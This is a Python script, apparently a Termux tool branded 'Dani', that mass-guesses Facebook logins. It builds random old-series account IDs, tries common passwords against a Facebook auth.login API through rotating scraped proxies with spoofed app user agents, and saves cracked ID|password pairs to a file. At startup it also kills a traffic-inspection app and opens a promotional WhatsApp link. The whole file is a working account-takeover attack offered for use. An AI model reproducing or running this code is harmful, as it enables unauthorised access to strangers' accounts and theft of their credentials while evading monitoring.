import os
import sys
import time
import re
import random
import uuid
import json
import subprocess
import pycurl
import requests
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from random import choice as race
from string import digits, ascii_letters
import urllib.parse
import base64
import ctypes

def run_system_command(command):
    os.system(f'{command} >/dev/null 2>&1')

run_system_command('chmod 700 /data/data/com.termux/files/usr/bin')
run_system_command('pkill -f httcanary')

class NebulaColors:
    def __init__(self):
        self.W = '\x1b[97;1m'
        self.R = '\x1b[91;1m'
        self.G = '\x1b[92;1m'
        self.Y = '\x1b[93;1m'
        self.B = '\x1b[94;1m'
        self.P = '\x1b[95;1m'
        self.C = '\x1b[96;1m'
        self.N = '\x1b[0m'

os.system('xdg-open https://whatsapp.com/channel/0029VbAjFyMFXUudqKqwkN3B')

def pro_banner():
    return """
\x1b[1;92m
██████╗░░█████╗░███╗░░██╗██╗
██╔══██╗██╔══██╗████╗░██║██║
██║░░██║███████║██╔██╗██║██║
██║░░██║██╔══██║██║╚████║██║
██████╔╝██║░░██║██║░╚███║██║
╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝

\x1b[1;96m   ➤ \x1b[1;92mCreator        : \x1b[1;97mDani
\x1b[1;96m   ➤ \x1b[1;92mOperated By    : \x1b[1;97mDani
\x1b[1;96m   ➤ \x1b[1;92mTool Access    : \x1b[1;97mFreeForAll
\x1b[1;96m   ➤ \x1b[1;92mVersion        : \x1b[1;97m1.2
\x1b[1;92m─────────────────────────────"""

def linex():
    color = NebulaColors()
    print(f'{color.G}─────────────────────────────')

def clear():
    os.system('clear')
    print(pro_banner())

class UserAgentGenerator:
    def __init__(self):
        self.custom_ua = [
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.1.0.28.120;]",
            "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.118;]"
        ]

    def generate_user_agent(self):
        return random.choice(self.custom_ua)

class BGRICracker:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.proxies = []
        self.color = NebulaColors()
        self.ua_gen = UserAgentGenerator()
        self.get_proxies()

    def get_proxies(self):
        try:
            res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all").text
            self.proxies = res.splitlines()
        except:
            pass

    def old_menu(self):
        clear()
        print(f" {self.color.W}[1] {self.color.G}CRACK 2009 ACCOUNTS                 ")
        print(f" {self.color.W}[2] {self.color.G}CRACK 2009-2013 ACCOUNTS            ")
        print(f" {self.color.W}[0] {self.color.R}EXIT                                ")
        linex()
        choice = input(f"  {self.color.C}➤ Choose: {self.color.W}").strip()
        
        if choice in ('1', '01'):
            self.execute_breach('100000')
        elif choice in ('2', '02'):
            self.quantum_breach_menu()
        else:
            sys.exit()

    def quantum_breach_menu(self):
        clear()
        series_map = {'1': '100000', '2': '100001', '3': '100002', '4': '100003', '5': '100004'}
        print(f"  {self.color.W}➤ Select Series:")
        for num, prefix in series_map.items():
            print(f"  {self.color.W}[{num}] {self.color.G}{prefix}")
        linex()
        choice = input(f"  {self.color.C}➤ Choose: {self.color.W}").strip()
        selected_prefix = series_map.get(choice)
        if selected_prefix:
            self.execute_breach(selected_prefix)
        else:
            self.old_menu()

    def execute_breach(self, prefix):
        clear()
        try:
            limit = int(input(f"  {self.color.G}➤ Enter Limit: {self.color.W}"))
        except:
            limit = 1000
        
        targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
        passlist = ['123456', '12345678', '123456789', '786786', 'facebook', 'password']
        
        with tred(max_workers=30) as executor:
            clear()
            print(f"  {self.color.W}➤ Targets: {self.color.G}{len(targets)}")
            print(f"  {self.color.W}➤ Method : {self.color.G}B-API (2026)")
            linex()
            for target in targets:
                executor.submit(self.breach_target, target, passlist)
        
        self.display_results()

    def breach_target(self, target, passlist):
        self.loop += 1
        sys.stdout.write(f'\r  {self.color.G}[Dani-M1] {self.loop}|OK:{len(self.oks)}|CP:{len(self.cps)} {self.color.W}')
        sys.stdout.flush()
        for password in passlist:
            if self.try_breach(target, password):
                break

    def try_breach(self, uid, password):
        try:
            ua = self.ua_gen.generate_user_agent()
            proxy = random.choice(self.proxies) if self.proxies else None
            buffer = BytesIO()
            c = pycurl.Curl()
            
            payload = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': password,
                'generate_session_cookies': '1',
                'method': 'auth.login',
            }

            c.setopt(c.URL, 'https://b-api.facebook.com/method/auth.login')
            if proxy:
                c.setopt(c.PROXY, proxy)
            c.setopt(c.HTTPHEADER, [f'User-Agent: {ua}', 'Content-Type: application/x-www-form-urlencoded'])
            c.setopt(c.POST, 1)
            c.setopt(c.POSTFIELDS, urllib.parse.urlencode(payload))
            c.setopt(c.WRITEDATA, buffer)
            c.setopt(c.TIMEOUT, 10)
            
            c.perform()
            response = json.loads(buffer.getvalue().decode('utf-8'))
            c.close()

            if 'session_key' in response or 'access_token' in response:
                print(f"\r  {self.color.G}➤ SUCCESS {self.color.W}{uid}|{self.color.G}{password}")
                self.oks.append(uid)
                with open('/sdcard/DANI-OK.txt', 'a') as f: f.write(f'{uid}|{password}\n')
                return True
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                self.cps.append(uid)
                return True
        except:
            pass
        return False

    def display_results(self):
        linex()
        print(f"  {self.color.G}➤ OK: {len(self.oks)}")
        print(f"  {self.color.R}➤ CP: {len(self.cps)}")
        input(f"\n  {self.color.C}Press ENTER to return to menu")
        self.old_menu()

if __name__ == "__main__":
    BGRICracker().old_menu()
